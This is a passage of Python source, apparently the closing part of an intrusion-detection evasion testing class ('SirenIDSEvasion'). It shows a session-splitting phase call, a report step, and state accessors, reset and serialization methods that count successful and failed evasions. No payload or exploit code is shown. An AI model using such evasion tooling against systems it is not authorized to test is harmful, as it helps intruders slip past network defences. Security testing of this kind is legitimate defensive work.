        # Phase 5: Session splitting
        self.test_session_splitting(payload, destination_ip=target)

        with self._lock:
            self._scan_end = time.time()

        # Phase 6: Report
        return self.generate_report(target=target, ids_vendor=ids_vendor)

    # ── Accessors ────────────────────────────────────────────────────────

    def get_findings(self) -> List[IDSFinding]:
        with self._lock:
            return list(self._findings)

    def reset(self) -> None:
        """Reset all evasion test state."""
        with self._lock:
            self._findings.clear()
            self._techniques_tested = 0
            self._successful_evasions = 0
            self._failed_evasions = 0
            self._partial_evasions = 0
            self._scan_phases.clear()
            self._scan_start = 0.0
            self._scan_end = 0.0
            logger.info("SirenIDSEvasion state reset")

    def to_dict(self) -> Dict[str, Any]:
        """Serialize orchestrator state."""
        with self._lock:
            return {
                "techniques_tested": self._techniques_tested,
                "successful": self._successful_evasions,
                "failed": self._failed_evasions,
                "partial": self._partial_evasions,
                "findings": len(self._findings),
                "phases": list(self._scan_phases),
                "duration": self._scan_end - self._scan_start if self._scan_end else 0.0,
            }
